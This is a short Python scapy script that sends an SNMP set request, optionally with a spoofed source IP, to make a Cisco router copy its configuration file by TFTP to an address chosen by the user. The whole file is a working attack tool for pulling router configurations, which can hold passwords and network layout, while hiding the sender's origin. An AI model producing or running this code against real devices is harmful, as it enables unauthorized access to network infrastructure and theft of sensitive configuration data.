import sys
from scapy.all import *

if len(sys.argv) < 4:
	print "Usage: get_router_config.py <community string> <destination ip> <source ip> [<spoofed src ip>]"
	exit()

comm_string = sys.argv[1]
dst_ip = sys.argv[2]
src_ip = sys.argv[3]

if len(sys.argv) > 4:
	spoof_ip = sys.argv[4]
else:
	spoof_ip = src_ip



packet = IP(src=spoof_ip,dst=dst_ip)/UDP(dport=161)/SNMP(community=comm_string,PDU=SNMPset(varbindlist=[SNMPvarbind(oid=ASN1_OID("1.3.6.1.4.1.9.2.1.55." + src_ip),value="router.config")]))

sr1(packet)
